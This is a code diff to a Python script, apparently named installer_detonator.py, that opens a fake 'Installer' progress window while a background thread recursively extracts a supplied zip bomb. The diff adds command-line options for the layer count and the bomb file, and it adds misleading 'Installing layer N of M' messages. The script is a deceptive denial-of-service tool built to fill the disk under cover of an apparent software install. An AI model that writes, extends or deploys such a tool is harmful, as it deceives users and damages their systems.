@@ -5,10 +5,11 @@ import time
 import tkinter as tk
 from tkinter import ttk
 import shutil
+import sys
 
-def extract_all_recursive(base_dir, progress_callback):
-    round = 0
-    while True:
+def extract_all_recursive(base_dir, max_layers):
+    global layer_progress
+    for _ in range(max_layers):
         found = False
         for root, dirs, files in os.walk(base_dir):
             for file in files:
@@ -20,36 +21,56 @@ def extract_all_recursive(base_dir, progress_callback):
                             zf.extractall(target_dir)
                         os.remove(zip_path)
                         found = True
-                        progress_callback()
-                    except Exception as e:
+                    except Exception:
                         pass
         if not found:
             break
-        round += 1
+        layer_progress += 1
+        update_layer_progress(layer_progress, max_layers)
+
+def update_layer_progress(current, total):
+    percent = int((current / total) * 100)
+    bar["value"] = percent
+    label_var.set(f"Installing layer {current} of {total}...")
+    root.update_idletasks()
 
 def detonate_zip_bomb():
     os.makedirs("bomb_detonated", exist_ok=True)
-    shutil.copy("bomb.zip", "bomb_detonated/bomb.zip")
-    extract_all_recursive("bomb_detonated", progress_step)
-
-def progress_step():
-    global progress
-    progress += 1
-    if progress < 100:
-        bar["value"] = progress
-        root.update_idletasks()
+    shutil.copy(bomb_filename, f"bomb_detonated/{bomb_filename}")
+    extract_all_recursive("bomb_detonated", max_layers)
 
 def run_gui():
-    global root, bar, progress
-    progress = 0
+    global root, bar, label_var
     root = tk.Tk()
-    root.title("Installer")
-    root.geometry("300x100")
-    ttk.Label(root, text="Installing... Please wait.").pack(pady=10)
+    root.title(f"Installer - {bomb_filename}")
+    root.geometry("320x100")
+
+    label_var = tk.StringVar()
+    label_var.set("Starting installation...")
+    ttk.Label(root, textvariable=label_var).pack(pady=10)
+
     bar = ttk.Progressbar(root, length=250, mode='determinate', maximum=100)
     bar.pack(pady=10)
+
     threading.Thread(target=detonate_zip_bomb, daemon=True).start()
     root.mainloop()
 
 if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Usage: python3 installer_detonator.py [layer_count] [bomb.zip]")
+        sys.exit(1)
+
+    try:
+        max_layers = int(sys.argv[1])
+    except ValueError:
+        print("Error: Invalid layer count.")
+        sys.exit(1)
+
+    bomb_filename = sys.argv[2]
+
+    if not os.path.isfile(bomb_filename):
+        print(f"Error: {bomb_filename} not found.")
+        sys.exit(1)
+
+    layer_progress = 0
     run_gui()
